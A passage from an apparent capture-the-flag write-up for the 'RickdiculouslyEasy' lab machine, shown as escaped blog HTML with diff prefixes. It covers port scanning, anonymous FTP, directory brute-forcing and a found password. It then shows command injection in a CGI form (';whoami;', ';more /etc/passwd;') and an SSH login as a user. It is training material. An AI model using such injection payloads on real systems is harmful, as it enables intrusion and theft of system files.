-SYN Stealth Scan Timing: About 25.49% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:12:11 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SYN Stealth Scan Timing: About 41.68% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:44 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:21 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Discovered open port 13337/tcp on 10.0.2.15
-SYN Stealth Scan Timing: About 49.01% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:44 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:10:22 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SYN Stealth Scan Timing: About 55.69% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:45 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:09:19 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SYN Stealth Scan Timing: About 61.36% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:45 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:08:16 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SYN Stealth Scan Timing: About 66.72% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:07:11 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SYN Stealth Scan Timing: About 72.09% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:06:05 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SYN Stealth Scan Timing: About 77.51% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:04:57 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SYN Stealth Scan Timing: About 82.81% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:03:49 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SYN Stealth Scan Timing: About 88.12% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:02:40 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SYN Stealth Scan Timing: About 93.19% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:01:32 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Discovered open port 22222/tcp on 10.0.2.15
-Completed SYN Stealth Scan at 05:50, 1569.31s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating Service scan at 05:50
-Scanning 7 services on 10.0.2.15
-Completed Service scan at 05:50, 11.01s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.2.15&lt;/span&gt;
-NSE: Script scanning 10.0.2.15.
-Initiating NSE at 05:50
-NSE: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ftp-bounce] PORT response: 500 Illegal PORT command.
-Completed NSE at 05:51, 30.28s elapsed
-Initiating NSE at 05:51
-Completed NSE at 05:51, 1.02s elapsed
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.15
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00081s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65528 closed ports
-PORT      STATE SERVICE VERSION
-21/tcp    open  ftp     vsftpd 3.0.3
-| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| &lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 0        0              42 Aug 22 05:10 FLAG.txt
-|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
-| ftp-syst:
-|   STAT:
-| FTP server status:
-|      Connected to ::ffff:10.0.2.4
-|      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 2
-|      vsFTPd 3.0.3 - secure, fast, stable
-|_End of status
-22/tcp    open  ssh?
-| fingerprint-strings:
-|   NULL:
-|_    Welcome to Ubuntu 14.04.5 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 4.4.0-31-generic x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp    open  http    Apache httpd 2.4.27 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Fedora&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-| http-methods:
-|   Supported Methods: HEAD GET POST OPTIONS TRACE
-|_  Potentially risky methods: TRACE
-|_http-server-header: Apache/2.4.27 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Fedora&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Morty&lt;span class=&quot;s1&quot;&gt;'s Website
-9090/tcp  open  http    Cockpit web service
-| http-methods:
-|_  Supported Methods: GET HEAD
-|_http-title: Did not follow redirect to https://10.0.2.15:9090/
-13337/tcp open  unknown
-| fingerprint-strings:
-|   NULL:
-|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
-22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
-| ssh-hostkey:
-|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
-|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
-|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (EdDSA)
-60000/tcp open  unknown
-|_drda-info: ERROR
-| fingerprint-strings:
-|   NULL, ibm-db2:
-|_    Welcome to Ricks half baked reverse shell...
-3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port22-TCP:V=7.60%I=7%D=11/1%Time=59F998F5%P=x86_64-pc-linux-gnu%r(NULL
-SF:,42,&quot;Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.4
-SF:\.0-31-generic\x20x86_64\)\n&quot;);
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port13337-TCP:V=7.60%I=7%D=11/1%Time=59F998F5%P=x86_64-pc-linux-gnu%r(N
-SF:ULL,29,&quot;FLAG:{TheyFoundMyBackDoorMorty}-10Points\n&quot;);
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port60000-TCP:V=7.60%I=7%D=11/1%Time=59F998FB%P=x86_64-pc-linux-gnu%r(N
-SF:ULL,2F,&quot;Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.
-SF:\.\n#\x20&quot;)%r(ibm-db2,2F,&quot;Welcome\x20to\x20Ricks\x20half\x20baked\x20re
-SF:verse\x20shell\.\.\.\n#\x20&quot;);
-MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.8
-Uptime guess: 35.438 days (since Tue Sep 26 19:20:25 2017)
-Network Distance: 1 hop
-TCP Sequence Prediction: Difficulty=259 (Good luck!)
-IP ID Sequence Generation: All zeros
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.81 ms 10.0.2.15
-
-NSE: Script Post-scanning.
-Initiating NSE at 05:51
-Completed NSE at 05:51, 0.00s elapsed
-Initiating NSE at 05:51
-Completed NSE at 05:51, 0.00s elapsed
-Read data files from: /usr/bin/../share/nmap
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 1615.79 seconds
-           Raw packets sent: 128763 (5.668MB) | Rcvd: 128754 (5.153MB)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And together with the results of this comprehensive scan, we get the first flag!&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;FLAG:{TheyFoundMyBackDoorMorty}-10Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now let’s take a look at all the services more closely. Firstly, we can check &lt;strong&gt;ftp&lt;/strong&gt; using anonymous login.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ftp 10.0.2.15
-Connected to 10.0.2.15.
-220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.0.2.15:root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Anonymous
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
-Using binary mode to transfer files.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    3 0        0              33 Aug 22 05:10 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x    3 0        0              33 Aug 22 05:10 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 0        0              42 Aug 22 05:10 FLAG.txt
-drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
-226 Directory send OK.
-ftp&amp;gt; get FLAG.txt
-&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: FLAG.txt remote: FLAG.txt
-200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
-150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;FLAG.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-226 Transfer complete.
-42 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;21.4967 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;pub
-250 Directory successfully changed.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    2 0        0               6 Feb 12  2017 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x    3 0        0              33 Aug 22 05:10 ..
-226 Directory send OK.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;exit
-&lt;/span&gt;221 Goodbye.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;That was easy, another flag is in our hands.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;FLAG{Whoa this is unexpected} - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Next part would be &lt;strong&gt;ssh&lt;/strong&gt; service running on port &lt;strong&gt;21&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh 10.0.2.15
-ssh_exchange_identification: Connection closed by remote host&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;But unfortunately it’s not working so we can move to another port. Before scanning the website I decided to look at port &lt;strong&gt;9090&lt;/strong&gt; which is &lt;strong&gt;cockpit web service&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;https://10.0.2.15:9090/
-FLAG {There is no Zeus, in your face!} - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Third flag! That’s 30 points already gathered. Now we can move on to the website scanning.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/rickdiculouslyeasy/main_web.png&quot; alt=&quot;Main Website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Now, as usuall, let’s brute force this website using &lt;strong&gt;dirbuster&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# dirb http://10.0.2.15/
-
-&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
-DIRB v2.22    
-By The Dark Raver
-&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
-
-START_TIME: Wed Nov  1 04:49:28 2017
-URL_BASE: http://10.0.2.15/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-
-&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
-
-GENERATED WORDS: 4612                                                          
-
-&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://10.0.2.15/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
-+ http://10.0.2.15/cgi-bin/ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:403|SIZE:217&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                
-+ http://10.0.2.15/index.html &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:326&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                              
-&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.15/passwords/                                     
-+ http://10.0.2.15/robots.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:126&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                              
-
-&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Entering directory: http://10.0.2.15/passwords/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;(!)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Use mode &lt;span class=&quot;s1&quot;&gt;'-w'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you want to scan it anyway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
-END_TIME: Wed Nov  1 04:49:31 2017
-DOWNLOADED: 4612 - FOUND: 3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;A few good hits, both looking very promising. I wonder what’s hidden inside &lt;strong&gt;passwords&lt;/strong&gt; directory.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/rickdiculouslyeasy/passwords.png&quot; alt=&quot;Passwords&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Another flag!&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;FLAG{Yeah d- just don't do it.} - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And what is much better, we have a password hidden in the comment of &lt;strong&gt;passwords.html&lt;/strong&gt; file. Let’s keep it in mind.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Morty's Website&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;&amp;lt;!--Password: winter--&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Another result of this scan was &lt;strong&gt;robots.txt&lt;/strong&gt; file, which we can check now.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;They're Robots Morty! It's ok to shoot them! They're just Robots!
-
-/cgi-bin/root_shell.cgi
-/cgi-bin/tracertool.cgi
-/cgi-bin/*&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Root shell console?&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://10.0.2.15/cgi-bin/root_shell.cgi
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;Root Shell
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
---UNDER CONSTRUCTION--
-&lt;span class=&quot;c&quot;&gt;&amp;lt;!--HAAHAHAHAAHHAaAAAGGAgaagAGAGAGG--&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;&amp;lt;!--I'm sorry Morty. It's a bummer.--&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;That’s bad, it would have been so much easier. Now let’s check the &lt;strong&gt;tracertool&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.2.15/cgi-bin/tracertool.cgi
-&quot;;whoami;
-apache&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;It’s a form that is vulnerable to &lt;strong&gt;command injection&lt;/strong&gt;. But as you can see, someone replaced the &lt;strong&gt;cat&lt;/strong&gt; command with the ASCII art of actuall cat.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&quot;;cat tracertool.cgi
-                      _
-                     | \
-                     | |
-                     | |
- |\                   | |
-/, ~\                / /
-X     `-.....-------./ /
-~-. ~  ~              |
-    \             /    |
-    \  /_     ___\   /
-    | /\ ~~~~~   \  |
-    | | \        || |
-    | |\ \       || )
-    (_/ (_/      ((_/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Fortunately there are more commands allowing us to view text such as &lt;strong&gt;more&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&quot;;more /etc/passwd;
-::::::::::::::
-/etc/passwd
-::::::::::::::
-root:x:0:0:root:/root:/bin/bash
-bin:x:1:1:bin:/bin:/sbin/nologin
-daemon:x:2:2:daemon:/sbin:/sbin/nologin
-adm:x:3:4:adm:/var/adm:/sbin/nologin
-lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
-sync:x:5:0:sync:/sbin:/bin/sync
-shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
-halt:x:7:0:halt:/sbin:/sbin/halt
-mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
-operator:x:11:0:operator:/root:/sbin/nologin
-games:x:12:100:games:/usr/games:/sbin/nologin
-ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
-nobody:x:99:99:Nobody:/:/sbin/nologin
-systemd-coredump:x:999:998:systemd Core Dumper:/:/sbin/nologin
-systemd-timesync:x:998:997:systemd Time Synchronization:/:/sbin/nologin
-systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
-systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
-dbus:x:81:81:System message bus:/:/sbin/nologin
-polkitd:x:997:996:User for polkitd:/:/sbin/nologin
-sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
-rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
-abrt:x:173:173::/etc/abrt:/sbin/nologin
-cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
-rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
-chrony:x:995:993::/var/lib/chrony:/sbin/nologin
-tcpdump:x:72:72::/:/sbin/nologin
-RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
-Morty:x:1001:1001::/home/Morty:/bin/bash
-Summer:x:1002:1002::/home/Summer:/bin/bash
-apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;I know that we have a password to one of these accounts, but to which one? Let’s check it using the &lt;strong&gt;ssh&lt;/strong&gt; port 22222.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22222 Summer@10.0.2.15
-Summer@10.0.2.15&lt;span class=&quot;s1&quot;&gt;'s password:
-Last failed login: Wed Nov  1 21:17:04 AEDT 2017 from 10.0.2.4 on ssh:notty
-There were 2 failed login attempts since the last successful login.
-Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104
-[Summer@localhost ~]$ whoami
-Summer&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;It’s working! Now we can take a look around the system.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[Summer@localhost ~]$ ls -la
-total 20
-drwx------. 2 Summer Summer  99 Sep 15 11:49 .
-drwxr-xr-x. 5 root   root    52 Aug 18 18:20 ..
--rw-------. 1 Summer Summer   1 Sep 15 11:51 .bash_history
--rw-r--r--. 1 Summer Summer  18 May 30 14:53 .bash_logout
--rw-r--r--. 1 Summer Summer 193 May 30 14:53 .bash_profile
--rw-r--r--. 1 Summer Summer 231 May 30 14:53 .bashrc
--rw-rw-r--. 1 Summer Summer  48 Aug 22 02:46 FLAG.txt
-[Summer@localhost ~]$ more FLAG.txt
-FLAG{Get off the high road Summer!} - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Another flag, and that’s &lt;strong&gt;50pts&lt;/strong&gt; already. Almost half way through.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Summer@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Summer@localhost home]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 0
-drwxr-xr-x.  5 root        root         52 Aug 18 18:20 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-dr-xr-xr-x. 17 root        root        236 Aug 18 19:16 ..
-drwxr-xr-x.  2 Morty       Morty       131 Sep 15 11:49 Morty
-drwxr-xr-x.  4 RickSanchez RickSanchez 113 Sep 21 10:30 RickSanchez
-drwx------.  2 Summer      Summer       99 Sep 15 11:49 Summer
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Summer@localhost home]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; Morty
-total 64
-drwxr-xr-x. 2 Morty Morty   131 Sep 15 11:49 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x. 5 root  root     52 Aug 18 18:20 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 Morty Morty     1 Sep 15 11:51 .bash_history
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 Morty Morty    18 May 30 14:53 .bash_logout
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 Morty Morty   193 May 30 14:53 .bash_profile
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 Morty Morty   231 May 30 14:53 .bashrc
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 root  root  43145 Aug 22 03:04 Safe_Password.jpg
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 root  root    414 Aug 22 03:06 journal.txt.zip
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Summer@localhost home]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; RickSanchez
-total 12
-drwxr-xr-x. 4 RickSanchez RickSanchez 113 Sep 21 10:30 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x. 5 root        root         52 Aug 18 18:20 ..
